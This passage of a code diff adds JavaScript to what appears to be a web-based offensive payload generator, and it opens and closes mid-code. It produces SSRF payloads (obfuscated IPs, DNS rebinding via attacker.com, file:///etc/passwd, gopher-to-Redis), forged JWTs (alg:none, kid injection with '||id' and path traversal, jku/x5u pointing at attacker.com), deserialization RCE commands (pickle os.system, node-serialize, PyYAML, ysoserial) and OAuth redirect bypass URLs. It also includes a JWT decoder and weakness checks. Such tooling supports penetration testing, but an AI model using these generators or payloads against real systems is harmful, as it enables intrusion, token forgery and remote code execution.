+                                const decimal = parts.reduce((acc, octet) => (acc << 8) + parseInt(octet), 0);
+                                finalPayloads.push(`${protocol}//${decimal}:${port}${path}`);
+                                // Hex
+                                const hex = parts.map(p => '0x' + parseInt(p).toString(16)).join('.');
+                                finalPayloads.push(`${protocol}//${hex}:${port}${path}`);
+                                // Octal
+                                const octal = parts.map(p => '0' + parseInt(p).toString(8)).join('.');
+                                finalPayloads.push(`${protocol}//${octal}:${port}${path}`);
+                                // Mixed (less common, might break URL parsers)
+                                // const mixed = `${parts[0]}.0x${parseInt(parts[1]).toString(16)}.${parseInt(parts[2])>>>0}.${parts[3]}`;
+                                // finalPayloads.push(`${protocol}//${mixed}:${port}${path}`);
+                                // Dword
+                                finalPayloads.push(`${protocol}//${(parseInt(parts[0]) << 24 | parseInt(parts[1]) << 16 | parseInt(parts[2]) << 8 | parseInt(parts[3])) >>> 0}:${port}${path}`);
+
+                            } else { finalPayloads.push(baseTarget); } // Not IPv4
+                        } else { finalPayloads.push(baseTarget); } // Not IP
+                        break;
+                    case 'dns_rebind':
+                        // These are hints, actual rebinding requires a controlled DNS server
+                        finalPayloads.push(`http://A.B.C.D.sslip.io`); // Example public service (replace A.B.C.D with target IP)
+                        finalPayloads.push(`http://${hostname}.attacker.com`); // Subdomain pointing to attacker DNS
+                        finalPayloads.push(`http://127.0.0.1.nip.io`); // Example public service for localhost
+                        finalPayloads.push(`Hint: Use a DNS rebinding service (e.g., rbndr.us, nip.io, sslip.io) or your own server.`);
+                        finalPayloads.push(`Example: Setup DNS for evil.com -> TTL 1 -> 127.0.0.1, then TTL 1 -> ATTACKER_IP`);
+                        break;
+                    case 'protocol':
+                        finalPayloads.push(`file:///etc/passwd`);
+                        finalPayloads.push(`file:///c:/windows/win.ini`);
+                        finalPayloads.push(`dict://${hostname}:${port}/info`); // DICT protocol
+                        // Gopher requires careful payload crafting based on target service
+                        finalPayloads.push(`gopher://${hostname}:${port}/_GET%20${encodeURIComponent(path)}%20HTTP/1.1%0d%0aHost:%20${hostname}%0d%0a%0d%0a`); // Basic HTTP GET via Gopher
+                        finalPayloads.push(`gopher://${hostname}:6379/_INFO%0d%0aQUIT%0d%0a`); // Redis INFO via Gopher
+                        break;
+                    case 'redirect':
+                        // Requires finding an open redirect vuln on an allowed domain
+                        finalPayloads.push(`http://allowed-domain.com/redirect?url=${encodeURIComponent(baseTarget)}`);
+                        finalPayloads.push(`http://allowed-domain.com/login?next=${encodeURIComponent(baseTarget)}`);
+                        finalPayloads.push(`Hint: Find an open redirect on a domain the application trusts.`);
+                        break;
+                    case 'filter_bypass':
+                        finalPayloads.push(baseTarget.replace(hostname, `${hostname}.`)); // Trailing dot
+                        finalPayloads.push(baseTarget.replace(hostname, `localhost`)); // If localhost is allowed
+                        finalPayloads.push(baseTarget.replace('http://', 'http://localhost@').replace('https://', 'https://localhost@')); // Userinfo bypass
+                        finalPayloads.push(baseTarget.replace('http://', 'http://google.com@').replace('https://', 'https://google.com@')); // Different domain bypass
+                        finalPayloads.push(baseTarget.replace(hostname, `[::]/${hostname}`)); // IPv6 bypass attempt
+                        finalPayloads.push(baseTarget.replace('http', 'hTtP')); // Case bypass
+                        break;
+                }
+            });
+            // --- End SSRF Technique Application ---
+
+
+            // Output Headers if any
+            if (Object.keys(headers).length > 0) {
+                 output += `<div class="text-yellow-400 font-bold mt-4 mb-2">Required Headers:</div>`;
+                 for (const header in headers) {
+                     const headerLine = `${header}: ${headers[header]}`;
+                     output += `<pre class="clickable" onclick="copyToClipboard('${escapeHTML(headerLine)}')">${escapeHTML(headerLine)}</pre>`;
+                 }
+            }
+
+            // Output Payloads
+            if (finalPayloads.length > 0) {
+                finalPayloads.forEach((payload, index) => {
+                    output += `<div class="mb-2">
+                        <div class="text-sm text-gray-500 mb-1">Payload #${index+1}:</div>
+                        <pre class="clickable" onclick="copyToClipboard('${escapeHTML(payload)}')">${escapeHTML(payload)}</pre>
+                    </div>`;
+                });
+            } else if (env !== 'custom' || customTargetInput) { // Avoid error if custom target was missing
+                output += `<div class="text-red-500">No payloads generated. Check target/technique combination.</div>`;
+            }
+
+            document.getElementById('ssrf_output').innerHTML = output;
+        }
+
+        function decodeJWT() {
+            const jwt = document.getElementById('jwt_token').value.trim();
+            const outputDiv = document.getElementById('jwt_output');
+            outputDiv.innerHTML = ''; // Clear previous output
+
+            if (!jwt) {
+                outputDiv.innerHTML = '<div class="text-red-500">Please paste a JWT token.</div>';
+                return;
+            }
+            if (jwt.split('.').length !== 3) {
+                outputDiv.innerHTML = '<div class="text-red-500">Invalid JWT format. Expecting header.payload.signature</div>';
+                return;
+            }
+
+            try {
+                const [headerB64, payloadB64, signature] = jwt.split('.');
+
+                // Base64 URL decode function
+                const b64UrlDecode = (str) => {
+                    let base64 = str.replace(/-/g, '+').replace(/_/g, '/');
+                    while (base64.length % 4) {
+                        base64 += '='; // Pad if necessary
+                    }
+                    return atob(base64);
+                };
+
+                const headerStr = b64UrlDecode(headerB64);
+                const payloadStr = b64UrlDecode(payloadB64);
+
+                const header = JSON.parse(headerStr);
+                const payload = JSON.parse(payloadStr);
+
+                let output = '<div class="text-yellow-400 font-bold mb-2">JWT Token Decoded:</div>';
+
+                output += `<div class="mb-4">
+                    <div class="text-green-400 font-bold">Header:</div>
+                    <pre>${escapeHTML(JSON.stringify(header, null, 2))}</pre>
+                </div>`;
+
+                output += `<div class="mb-4">
+                    <div class="text-green-400 font-bold">Payload:</div>
+                    <pre>${escapeHTML(JSON.stringify(payload, null, 2))}</pre>
+                </div>`;
+
+                output += `<div class="mb-4">
+                    <div class="text-green-400 font-bold">Signature (Base64URL):</div>
+                    <pre class="clickable" onclick="copyToClipboard('${escapeHTML(signature)}')">${escapeHTML(signature)}</pre>
+                </div>`;
+
+                // Time analysis
+                if (payload.exp || payload.iat || payload.nbf) {
+                    output += `<div class="mb-4"><div class="text-green-400 font-bold">Time Analysis (UTC):</div>`;
+                    const now = Math.floor(Date.now() / 1000);
+                    const formatTime = (timestamp) => timestamp ? `${new Date(timestamp * 1000).toUTCString()} (${timestamp})` : 'N/A';
+
+                    output += `<div>Issued At (iat): ${formatTime(payload.iat)}</div>`;
+                    output += `<div>Not Before (nbf): ${formatTime(payload.nbf)} ${payload.nbf && now < payload.nbf ? '<span class="text-red-500">(Not Yet Valid)</span>' : ''}</div>`;
+                    output += `<div>Expiration (exp): ${formatTime(payload.exp)} ${payload.exp && now > payload.exp ? '<span class="text-red-500">(Expired)</span>' : ''}</div>`;
+
+                    if (payload.exp && now <= payload.exp) {
+                        const expIn = payload.exp - now;
+                        const days = Math.floor(expIn / 86400);
+                        const hours = Math.floor((expIn % 86400) / 3600);
+                        const minutes = Math.floor((expIn % 3600) / 60);
+                        output += `<div>Expires in: ${days}d ${hours}h ${minutes}m</div>`;
+                    } else if (payload.exp && now > payload.exp) {
+                         const expiredAgo = now - payload.exp;
+                         const days = Math.floor(expiredAgo / 86400);
+                         const hours = Math.floor((expiredAgo % 86400) / 3600);
+                         const minutes = Math.floor((expiredAgo % 3600) / 60);
+                         output += `<div>Expired: ${days}d ${hours}h ${minutes}m ago</div>`;
+                    }
+                    output += `</div>`;
+                }
+
+                outputDiv.innerHTML = output;
+
+            } catch (e) {
+                console.error("JWT Decode Error:", e);
+                outputDiv.innerHTML = `<div class="text-red-500">Error decoding JWT: ${escapeHTML(e.message)}. Check Base64 padding or JSON format.</div>`;
+            }
+        }
+
+        function analyzeJWT() {
+            const jwt = document.getElementById('jwt_token').value.trim();
+            const outputDiv = document.getElementById('jwt_output');
+            outputDiv.innerHTML = ''; // Clear
+
+            if (!jwt || jwt.split('.').length !== 3) {
+                outputDiv.innerHTML = '<div class="text-red-500">Invalid JWT format. Paste a valid token first.</div>';
+                return;
+            }
+
+            try {
+                const [headerB64, payloadB64, signature] = jwt.split('.');
+                const b64UrlDecode = (str) => atob(str.replace(/-/g, '+').replace(/_/g, '/'));
+                const header = JSON.parse(b64UrlDecode(headerB64));
+                const payload = JSON.parse(b64UrlDecode(payloadB64));
+
+                let output = '<div class="text-yellow-400 font-bold mb-2">JWT Vulnerability Analysis:</div>';
+                let issuesFound = false;
+
+                // --- Analysis Checks ---
+                if (header.alg && header.alg.toLowerCase() === 'none') {
+                    issuesFound = true;
+                    const nonePayload = `${headerB64}.${payloadB64}.`;
+                    output += `<div class="mb-3 p-2 border border-red-500 rounded">
+                        <div class="font-bold text-red-500">High Risk: Algorithm 'none' Detected</div>
+                        <div>Signature validation is disabled. The token can be arbitrarily modified.</div>
+                        <div class="mt-1 font-bold">Exploit Example (No Signature):</div>
+                        <pre class="clickable mt-1" onclick="copyToClipboard('${escapeHTML(nonePayload)}')">${escapeHTML(nonePayload)}</pre>
+                    </div>`;
+                }
+
+                if (header.alg && header.alg.toLowerCase().startsWith('hs')) { // HS256, HS384, HS512
+                    issuesFound = true;
+                    output += `<div class="mb-3 p-2 border border-yellow-500 rounded">
+                        <div class="font-bold text-yellow-500">Potential Risk: Symmetric Algorithm (${escapeHTML(header.alg)})</div>
+                        <div>Vulnerable to secret brute-forcing if the secret is weak. Consider using asymmetric algorithms (RS/ES/PS).</div>
+                        <div class="mt-1 font-bold">Actions:</div>
+                        <div>- Attempt brute-force with common wordlists (e.g., using hashcat mode 16500).</div>
+                        <div>- Check for hardcoded secrets in client-side code or public repositories.</div>
+                    </div>`;
+                }
+
+                if (header.alg && header.alg.toLowerCase().startsWith('rs') && !header.alg.toLowerCase().startsWith('rsapss')) {
+                     output += `<div class="mb-3 p-2 border border-yellow-500 rounded">
+                        <div class="font-bold text-yellow-500">Note: RS Algorithm (${escapeHTML(header.alg)})</div>
+                        <div>Ensure proper padding (OAEP recommended over PKCS#1 v1.5) is used during verification to prevent certain attacks. PS algorithms are generally preferred.</div>
+                    </div>`;
+                }
+
+                const recommendedClaims = ['exp', 'iat', 'nbf', 'iss', 'aud', 'sub', 'jti'];
+                const missingClaims = recommendedClaims.filter(claim => !(claim in payload));
+                if (missingClaims.length > 0) {
+                    issuesFound = true;
+                    output += `<div class="mb-3 p-2 border border-yellow-500 rounded">
+                        <div class="font-bold text-yellow-500">Potential Issue: Missing Recommended Claims</div>
+                        <div>Missing: ${missingClaims.join(', ')}.</div>
+                        <div>Lack of claims like 'exp' (expiration), 'nbf' (not before), 'aud' (audience), 'iss' (issuer), 'jti' (JWT ID) can lead to replay attacks, token misuse, or scope issues.</div>
+                    </div>`;
+                }
+
+                if (payload.exp) {
+                    const now = Math.floor(Date.now() / 1000);
+                    if (payload.exp < now) {
+                        issuesFound = true;
+                        output += `<div class="mb-3 p-2 border border-red-500 rounded">
+                            <div class="font-bold text-red-500">Issue: Token Expired</div>
+                            <div>The 'exp' claim (${new Date(payload.exp * 1000).toUTCString()}) is in the past. Ensure the server properly rejects expired tokens.</div>
+                        </div>`;
+                    } else if (payload.exp > now + 3600 * 24 * 7) { // Example: Expires more than a week in the future
+                         output += `<div class="mb-3 p-2 border border-yellow-500 rounded">
+                            <div class="font-bold text-yellow-500">Potential Issue: Long Expiration Time</div>
+                            <div>The 'exp' claim (${new Date(payload.exp * 1000).toUTCString()}) is far in the future. Shorter lifetimes reduce the window for token compromise.</div>
+                        </div>`;
+                    }
+                } else {
+                     output += `<div class="mb-3 p-2 border border-red-500 rounded">
+                        <div class="font-bold text-red-500">High Risk: Missing 'exp' Claim</div>
+                        <div>Token does not expire, allowing indefinite use if compromised.</div>
+                    </div>`;
+                }
+
+                if (header.kid) {
+                    issuesFound = true;
+                    output += `<div class="mb-3 p-2 border border-yellow-500 rounded">
+                        <div class="font-bold text-yellow-500">Potential Risk: 'kid' Parameter Present</div>
+                        <div>Value: "${escapeHTML(header.kid)}".</div>
+                        <div>If the 'kid' is used insecurely (e.g., in file paths, SQL queries), it could lead to Path Traversal, SQLi, or Command Injection. Test this parameter thoroughly.</div>
+                        <div class="mt-1 font-bold">Actions:</div>
+                        <div>- Try path traversal payloads: "../../../dev/null", "key.pem".</div>
+                        <div>- Try SQLi payloads: "' OR 1=1 --".</div>
+                        <div>- Try command injection payloads: "; id", "||id".</div>
+                    </div>`;
+                }
+
+                if (header.jku) {
+                    issuesFound = true;
+                    output += `<div class="mb-3 p-2 border border-red-500 rounded">
+                        <div class="font-bold text-red-500">High Risk: 'jku' (JWK Set URL) Parameter Present</div>
+                        <div>Value: "${escapeHTML(header.jku)}".</div>
+                        <div>Allows specifying a URL for the key set. If the server fetches keys from arbitrary URLs, an attacker can host their own keys. Ensure the server validates the JKU URL against an allowlist.</div>
+                    </div>`;
+                }
+                 if (header.jwk) {
+                    issuesFound = true;
+                    output += `<div class="mb-3 p-2 border border-red-500 rounded">
+                        <div class="font-bold text-red-500">High Risk: 'jwk' (JSON Web Key) Parameter Present</div>
+                        <div>Allows embedding the public key directly in the header. If the server trusts the embedded key without validation, an attacker can sign tokens with their own key.</div>
+                    </div>`;
+                }
+                 if (header.x5u) {
+                    issuesFound = true;
+                    output += `<div class="mb-3 p-2 border border-yellow-500 rounded">
+                        <div class="font-bold text-yellow-500">Potential Risk: 'x5u' (X.509 URL) Parameter Present</div>
+                        <div>Value: "${escapeHTML(header.x5u)}".</div>
+                        <div>Allows specifying a URL for the X.509 certificate chain. Similar risks to 'jku' if the URL is not validated against an allowlist.</div>
+                    </div>`;
+                }
+                 if (header.x5c) {
+                     issuesFound = true;
+                     output += `<div class="mb-3 p-2 border border-yellow-500 rounded">
+                        <div class="font-bold text-yellow-500">Potential Risk: 'x5c' (X.509 Certificate Chain) Parameter Present</div>
+                        <div>Allows embedding the certificate chain. Ensure the server validates the chain properly and doesn't blindly trust the embedded certificate.</div>
+                    </div>`;
+                 }
+
+                const sensitiveKeywords = ['password', 'secret', 'apiKey', 'api_key', 'token', 'private', 'admin', 'root', 'config', 'credential', 'accessKey', 'secretKey'];
+                const foundSensitive = Object.keys(payload).filter(key =>
+                    sensitiveKeywords.some(keyword => key.toLowerCase().includes(keyword.toLowerCase()))
+                );
+                if (foundSensitive.length > 0) {
+                    issuesFound = true;
+                    output += `<div class="mb-3 p-2 border border-yellow-500 rounded">
+                        <div class="font-bold text-yellow-500">Potential Issue: Sensitive Data in Payload</div>
+                        <div>Found potentially sensitive keys: ${foundSensitive.map(escapeHTML).join(', ')}.</div>
+                        <div>JWT payloads are only Base64 encoded, not encrypted. Avoid storing sensitive information directly in the payload.</div>
+                    </div>`;
+                }
+                // --- End Analysis Checks ---
+
+                if (!issuesFound) {
+                    output += '<div class="text-green-400">No obvious high-risk vulnerabilities detected based on header and standard claims. Manual verification and testing are still required.</div>';
+                }
+
+                outputDiv.innerHTML = output;
+
+            } catch (e) {
+                console.error("JWT Analyze Error:", e);
+                outputDiv.innerHTML = `<div class="text-red-500">Error analyzing JWT: ${escapeHTML(e.message)}.</div>`;
+            }
+        }
+
+        function tamperedJWT() {
+            const jwt = document.getElementById('jwt_token').value.trim();
+            const attackType = document.getElementById('jwt_attack').value;
+            const keyInput = document.getElementById('jwt_key').value.trim(); // Secret or Public Key PEM
+            const outputDiv = document.getElementById('jwt_output');
+            outputDiv.innerHTML = ''; // Clear
+
+            if (!jwt || jwt.split('.').length !== 3) {
+                outputDiv.innerHTML = '<div class="text-red-500">Invalid JWT format. Paste a valid token first.</div>';
+                return;
+            }
+
+            try {
+                const [headerB64, payloadB64, signatureB64Url] = jwt.split('.');
+                const b64UrlDecode = (str) => atob(str.replace(/-/g, '+').replace(/_/g, '/'));
+                const b64UrlEncode = (str) => btoa(str).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
+
+                const header = JSON.parse(b64UrlDecode(headerB64));
+                const payload = JSON.parse(b64UrlDecode(payloadB64));
+
+                let output = `<div class="text-yellow-400 font-bold mb-2">JWT Tampering Attack Payloads (${escapeHTML(attackType)}):</div>`;
+                let tamperedJwts = []; // Array to hold generated JWTs for this attack
+
+                // --- Tampering Logic ---
+                if (attackType === 'alg_none') {
+                    const newHeader = { ...header, alg: 'none' };
+                    const newHeaderB64 = b64UrlEncode(JSON.stringify(newHeader));
+                    tamperedJwts.push({ name: "alg:none (Signature Stripped)", jwt: `${newHeaderB64}.${payloadB64}.` });
+                } else if (attackType === 'kid_inject') {
+                    const injectValues = [
+                        "../../../etc/passwd", // Path Traversal
+                        "key.pem",             // Path Traversal
+                        "' OR 1=1 -- ",        // SQLi
+                        "||id",                // Command Injection
+                        "file:///dev/null"     // File Path
+                    ];
+                    injectValues.forEach(val => {
+                        const newHeader = { ...header, kid: val };
+                        const newHeaderB64 = b64UrlEncode(JSON.stringify(newHeader));
+                        // Keep original signature, as the attack targets the kid processing logic
+                        tamperedJwts.push({ name: `kid Injection: ${escapeHTML(val)}`, jwt: `${newHeaderB64}.${payloadB64}.${signatureB64Url}` });
+                    });
+                } else if (attackType === 'jwk_inject') {
+                    // Note: This requires the attacker to generate a key pair and re-sign the token.
+                    // This example just shows the header modification.
+                    const attackerPubKey = { // Example JWK (replace with actual attacker key)
+                        "kty": "RSA",
+                        "e": "AQAB",
+                        "kid": "attacker_key",
+                        "n": "..." // Attacker's public modulus (Base64URL)
+                    };
+                    const newHeader = { ...header, alg: 'RS256', jwk: attackerPubKey }; // Change alg if needed
+                    const newHeaderB64 = b64UrlEncode(JSON.stringify(newHeader));
+                    // Payload might need modification too. Signature MUST be recalculated with attacker's private key.
+                    tamperedJwts.push({ name: "jwk Injection (Header Only - Needs Re-Signing)", jwt: `${newHeaderB64}.${payloadB64}.SIGNATURE_NEEDED` });
+                    output += `<div class="text-sm text-yellow-500 mb-2">Note: JWK injection requires re-signing the token with the attacker's private key corresponding to the injected JWK.</div>`;
+                } else if (attackType === 'jku_inject') {
+                    const attackerJku = "https://attacker.com/jwks.json"; // URL hosting attacker's JWKS
+                    const newHeader = { ...header, jku: attackerJku };
+                    const newHeaderB64 = b64UrlEncode(JSON.stringify(newHeader));
+                    // Keep original signature, attack relies on server fetching wrong keys
+                    tamperedJwts.push({ name: `jku Injection: ${escapeHTML(attackerJku)}`, jwt: `${newHeaderB64}.${payloadB64}.${signatureB64Url}` });
+                    output += `<div class="text-sm text-yellow-500 mb-2">Note: Ensure a valid JWKS file is hosted at the specified JKU URL containing the public key needed for verification.</div>`;
+                } else if (attackType === 'x5u_inject') {
+                     const attackerX5u = "https://attacker.com/cert.pem"; // URL hosting attacker's cert
+                    const newHeader = { ...header, x5u: attackerX5u };
+                    const newHeaderB64 = b64UrlEncode(JSON.stringify(newHeader));
+                    // Keep original signature, attack relies on server fetching wrong cert
+                    tamperedJwts.push({ name: `x5u Injection: ${escapeHTML(attackerX5u)}`, jwt: `${newHeaderB64}.${payloadB64}.${signatureB64Url}` });
+                    output += `<div class="text-sm text-yellow-500 mb-2">Note: Ensure a valid X.509 certificate (whose public key can verify the signature) is hosted at the specified X5U URL.</div>`;
+                } else if (attackType === 'signature_bypass') {
+                    tamperedJwts.push({ name: "Empty Signature", jwt: `${headerB64}.${payloadB64}.` });
+                    tamperedJwts.push({ name: "Null Byte Signature", jwt: `${headerB64}.${payloadB64}.${signatureB64Url}%00` });
+                    tamperedJwts.push({ name: "Signature as 'null'", jwt: `${headerB64}.${payloadB64}.null` });
+                    // Add more techniques if applicable
+                } else if (attackType === 'payload_tamper') {
+                    const newPayload = { ...payload };
+                    // Example modifications (add more sophisticated logic as needed)
+                    newPayload.role = 'admin';
+                    newPayload.user = 'attacker';
+                    newPayload.uid = 0;
+                    if (newPayload.exp) { // Extend expiration if present
+                        newPayload.exp += 3600 * 24; // Add 1 day
+                    }
+                    const newPayloadB64 = b64UrlEncode(JSON.stringify(newPayload));
+                    // Needs re-signing with the correct key/algorithm
+                    tamperedJwts.push({ name: "Payload Tampered (Needs Re-Signing)", jwt: `${headerB64}.${newPayloadB64}.SIGNATURE_NEEDED` });
+                     output += `<div class="text-sm text-yellow-500 mb-2">Note: Payload tampering requires re-signing the token with the original algorithm and key, or exploiting another vulnerability (like alg:none).</div>`;
+                }
+                // --- End Tampering Logic ---
+
+                if (tamperedJwts.length > 0) {
+                    tamperedJwts.forEach(item => {
+                        output += `<div class="mb-3">
+                            <div class="text-sm text-green-400 mb-1">${escapeHTML(item.name)}:</div>
+                            <pre class="clickable" onclick="copyToClipboard('${escapeHTML(item.jwt)}')">${escapeHTML(item.jwt)}</pre>
+                        </div>`;
+                    });
+                } else {
+                    output += '<div class="text-gray-500">No specific payload generated for this attack type yet, or requires manual steps (like re-signing).</div>';
+                }
+
+                outputDiv.innerHTML = output;
+
+            } catch (e) {
+                console.error("JWT Tamper Error:", e);
+                outputDiv.innerHTML = `<div class="text-red-500">Error tampering JWT: ${escapeHTML(e.message)}.</div>`;
+            }
+        }
+
+        function generateDeserialization() {
+            const language = document.getElementById('deser_language').value;
+            const gadget = document.getElementById('deser_gadget').value;
+            const command = document.getElementById('deser_command').value.trim();
+            const outputDiv = document.getElementById('deser_output');
+            outputDiv.innerHTML = ''; // Clear
+
+            if (!command) {
+                 outputDiv.innerHTML = '<div class="text-red-500">Please enter a command, URL, or file path.</div>';
+                 return;
+            }
+
+            let output = `<div class="text-yellow-400 font-bold mb-2">Deserialization Payload Command (${escapeHTML(language)} / ${escapeHTML(gadget)}):</div>`;
+            let toolCommand = '';
+            let note = '';
+
+            // --- Deserialization Command Generation ---
+            switch (language) {
+                case 'java':
+                    // Assumes ysoserial is available
+                    let ysoserialGadget = 'CommonsCollections1'; // Default guess
+                    if (gadget === 'rce') ysoserialGadget = 'CommonsBeanutils1'; // Common RCE gadget
+                    if (gadget === 'ssrf') ysoserialGadget = 'URLDNS'; // For DNS check, not full SSRF usually
+                    if (gadget === 'fileread') note = 'File read often requires custom gadgets or specific libraries.';
+                    toolCommand = `java -jar ysoserial-all.jar ${ysoserialGadget} "${command}"`;
+                    note += ' Requires ysoserial. Gadget chain depends heavily on target classpath.';
+                    break;
+                case 'php':
+                    // Assumes phpggc is available
+                    let phpggcGadget = 'Monolog/RCE1'; // Common RCE
+                    if (gadget === 'filewrite') phpggcGadget = 'Monolog/FW1';
+                    toolCommand = `./phpggc ${phpggcGadget} "${command}"`;
+                    note = 'Requires phpggc and appropriate gadget chain for the target application (e.g., Laravel, Symfony, Drupal).';
+                    break;
+                case 'dotnet':
+                     // Assumes ysoserial.net is available
+                     let dotnetGadget = 'ObjectDataProvider'; // Common gadget
+                     let formatter = 'BinaryFormatter'; // Common formatter
+                     if (gadget === 'rce') dotnetGadget = 'ActivitySurrogateSelectorFromFile'; // Needs file write first usually
+                     toolCommand = `ysoserial.exe -g ${dotnetGadget} -f ${formatter} -c "${command}"`;
+                     note = 'Requires ysoserial.net. Gadget and formatter depend on target application.';
+                     break;
+                case 'python':
+                     // Pickle RCE example
+                     if (gadget === 'rce') {
+                         toolCommand = `python -c "import pickle, base64, os; class RCE: def __reduce__(self): return (os.system, ('${command}',)); print(base64.b64encode(pickle.dumps(RCE())).decode())"`;
+                         note = 'Generates Base64 encoded Pickle payload for os.system RCE. Target must deserialize untrusted data.';
+                     } else {
+                         note = 'Python deserialization attacks (pickle, PyYAML) depend heavily on context.';
+                     }
+                     break;
+                 case 'ruby':
+                     if (gadget === 'rce') {
+                         // Example using Marshal and a universal gadget (may not always work)
+                         toolCommand = `ruby -e 'require "base64"; class Exploit; def initialize(cmd); @cmd=cmd; end; def marshal_dump; [@cmd]; end; def marshal_load(arr); system(arr[0]); end; end; puts Base64.encode64(Marshal.dump(Exploit.new("${command}")))'`;
+                         note = 'Generates Base64 encoded Marshal payload. Success depends on target code.';
+                     } else {
+                         note = 'Ruby deserialization (Marshal, YAML) depends on context and available gadgets.';
+                     }
+                     break;
+                 case 'nodejs':
+                     if (gadget === 'rce') {
+                         // Example using node-serialize immediately invoked function expression (IIFE)
+                         toolCommand = `node -e "console.log(JSON.stringify({'rce':'_$$ND_FUNC$$_function (){require(\\'child_process\\').exec(\\'${command}\\');}()'}))"`;
+                         note = 'Generates JSON payload for node-serialize RCE. Target must use vulnerable library.';
+                     } else {
+                         note = 'Node.js deserialization vulnerabilities often involve libraries like node-serialize or specific prototype pollution chains.';
+                     }
+                     break;
+                 case 'yaml':
+                     if (gadget === 'rce') {
+                         // Example for PyYAML RCE
+                         toolCommand = `echo '!!python/object/apply:os.system ["${command}"]'`;
+                         note = 'Generates YAML payload for PyYAML RCE. Target must use unsafe_load().';
+                     } else {
+                         note = 'YAML deserialization attacks depend on the parser library (e.g., PyYAML, ruby YAML).';
+                     }
+                     break;
+            }
+            // --- End Deserialization Command Generation ---
+
+            if (toolCommand) {
+                 output += `<div class="mb-3">
+                    <div class="text-sm text-green-400 mb-1">Tool Command (Example):</div>
+                    <pre class="clickable" onclick="copyToClipboard('${escapeHTML(toolCommand)}')">${escapeHTML(toolCommand)}</pre>
+                 </div>`;
+            } else {
+                 output += `<div class="text-gray-500 mb-3">Payload generation for this combination might require manual crafting or specific tool usage.</div>`;
+            }
+
+            if (note) {
+                 output += `<div class="text-sm text-yellow-500">${escapeHTML(note)}</div>`;
+            }
+
+            outputDiv.innerHTML = output;
+        }
+
+        function generateOAuthExploit() {
+            const clientId = document.getElementById('oauth_client_id').value.trim();
+            const redirectUri = document.getElementById('oauth_redirect_uri').value.trim();
+            const authUrl = document.getElementById('oauth_auth_url').value.trim();
+            const attackType = document.getElementById('oauth_attack').value;
+            const attackerUri = document.getElementById('oauth_attacker_uri').value.trim() || 'https://attacker.com/callback';
+            const outputDiv = document.getElementById('oauth_output');
+            outputDiv.innerHTML = ''; // Clear
+
+            if (!authUrl || !redirectUri || !clientId) {
+                 outputDiv.innerHTML = '<div class="text-red-500">Please provide Authorization URL, Registered Redirect URI, and Client ID.</div>';
+                 return;
+            }
+
+            let output = `<div class="text-yellow-400 font-bold mb-2">OAuth 2.0 Attack URLs (${escapeHTML(attackType)}):</div>`;
+            let attackUrls = [];
+            let note = '';
+
+            const baseParams = `client_id=${encodeURIComponent(clientId)}&response_type=code&scope=openid%20profile%20email`; // Common defaults
+
+            // --- OAuth Attack URL Generation ---
+            try {
+                const registeredUrl = new URL(redirectUri);
+
+                switch (attackType) {
+                    case 'redirect_uri':
+                        note = 'Attempts to bypass redirect_uri validation. Success depends on server-side checks.';
+                        // Subdomain bypass
+                        attackUrls.push({ name: "Subdomain Bypass", url: `${authUrl}?${baseParams}&redirect_uri=${encodeURIComponent(registeredUrl.protocol + '//attacker.' + registeredUrl.hostname + '/callback')}` });
+                        // Path bypass
+                        attackUrls.push({ name: "Path Bypass", url: `${authUrl}?${baseParams}&redirect_uri=${encodeURIComponent(redirectUri + '.attacker.com')}` });
+                        // Query parameter bypass
+                        attackUrls.push({ name: "Query Parameter Bypass", url: `${authUrl}?${baseParams}&redirect_uri=${encodeURIComponent(redirectUri + '?attacker=evil')}` });
+                        // Fragment bypass (#)
+                        attackUrls.push({ name: "Fragment Bypass", url: `${authUrl}?${baseParams}&redirect_uri=${encodeURIComponent(redirectUri + '#@attacker.com')}` });
+                        // Different Scheme
+                        attackUrls.push({ name: "Different Scheme", url: `${authUrl}?${baseParams}&redirect_uri=${encodeURIComponent('https://' + registeredUrl.hostname + registeredUrl.pathname)}` }); // If original was http
+                        // URL Encoded Chars
+                        attackUrls.push({ name: "Encoded Chars Bypass", url: `${authUrl}?${baseParams}&redirect_uri=${encodeURIComponent(redirectUri.replace(/\./g, '%2E'))}` });
+                        break;
+                    case 'state':
+                        note = 'Tests for CSRF protection. If state is missing or not validated, an attacker can initiate the flow and intercept the code/token.';
+                        // Missing state
+                        attackUrls.push({ name: "Missing State Parameter", url: `${authUrl}?${baseParams}&redirect_uri=${encodeURIComponent(redirectUri)}` });
+                        // Empty state
+                        attackUrls.push({ name: "Empty State Parameter", url: `${authUrl}?${baseParams}&redirect_uri=${encodeURIComponent(redirectUri)}&state=` });
+                        // Re-using victim's state (requires separate mechanism)
+                        attackUrls.push({ name: "Re-using State (Conceptual)", url: `${authUrl}?${baseParams}&redirect_uri=${encodeURIComponent(attackerUri)}&state=VICTIM_STATE_VALUE` });
+                        break;
+                    case 'scope':
+                        note = 'Attempts to request higher privileges or different scopes than intended.';
+                        // Adding common sensitive scopes
+                        attackUrls.push({ name: "Add Admin Scope", url: `${authUrl}?${baseParams}%20admin&redirect_uri=${encodeURIComponent(redirectUri)}&state=test` });
+                        attackUrls.push({ name: "Add Read/Write Scope", url: `${authUrl}?${baseParams}%20read%20write&redirect_uri=${encodeURIComponent(redirectUri)}&state=test` });
+                        attackUrls.push({ name: "Add Offline Access", url: `${authUrl}?${baseParams}%20offline_access&redirect_uri=${encodeURIComponent(redirectUri)}&state=test` });
+                        // Replacing scopes
+                        attackUrls.push({ name: "Replace with Sensitive Scope", url: `${authUrl}?client_id=${encodeURIComponent(clientId)}&response_type=code&scope=admin&redirect_uri=${encodeURIComponent(redirectUri)}&state=test` });
+                        break;
+                    case 'response_type':
+                        note = 'Attempts to switch the flow (e.g., from code to token) to leak tokens directly in the URL fragment.';
+                        // Switch to token (Implicit Flow)
+                        attackUrls.push({ name: "Switch to 'token'", url: `${authUrl}?client_id=${encodeURIComponent(clientId)}&response_type=token&scope=openid&redirect_uri=${encodeURIComponent(redirectUri)}&state=test` });
+                        // Switch to id_token token
+                        attackUrls.push({ name: "Switch to 'id_token token'", url: `${authUrl}?client_id=${encodeURIComponent(clientId)}&response_type=id_token%20token&scope=openid&redirect_uri=${encodeURIComponent(redirectUri)}&state=test&nonce=randomnonce` });
+                        // Switch to code token
+                        attackUrls.push({ name: "Switch to 'code token'", url: `${authUrl}?client_id=${encodeURIComponent(clientId)}&response_type=code%20token&scope=openid&redirect_uri=${encodeURIComponent(redirectUri)}&state=test&nonce=randomnonce` });
+                        break;
+                    case 'open_redirect':
+                        note = 'Chains an open redirect vulnerability on the client application with the OAuth flow.';
